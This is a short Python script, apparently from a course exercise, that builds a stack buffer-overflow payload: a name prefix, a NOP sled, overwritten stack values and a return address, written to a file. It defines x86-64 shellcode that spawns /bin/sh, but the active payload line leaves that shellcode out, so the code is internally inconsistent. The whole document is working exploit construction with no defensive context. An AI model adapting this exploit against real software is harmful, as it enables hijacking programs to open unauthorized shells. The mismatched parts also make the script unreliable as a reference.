import binascii

def fixEndian(b):
        c = b[6:8]
        c += b[4:6]
        c += b[2:4]
        c += b[0:2]
        return c


myName = "Mark Thompson".encode()
shcode =  '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#endAdr = 'bbbbbbbb'
retAdr = 'bffff6d8'

s =['bffff6d8','b7e6d3ff','bffff3a0','000002e1','0804b008','000002e8','b7fcdac0','00000004']

sp = ''
for i in range(len(s)):
        sp += fixEndian(s[i])

#create long buffer string, using NOP code 90. 
buffLen = 742 - len(myName) - len(shcode) 
print(buffLen)
buffString = binascii.a2b_hex(''.join("90"*buffLen))

retAdr = binascii.a2b_hex(''.join(retAdr))
#endAdr = binascii.a2b_hex(''.join(endAdr))
sp = binascii.a2b_hex(''.join(sp))


by = myName + buffString + sp + retAdr
#by =  myName + endAdr *4 + shcode  # my name and shell code 
# shell code from http://shell-storm.org/shellcode/files/shellcode-806.php
#by += binascii.a2b_hex(''.join(buffString))
#by += endAdr
#by += preserve
#by += retAdr
         # return address that should overwrite the existing return address and send code to shell code
f = open('testFile2','wb')
f.write(by)
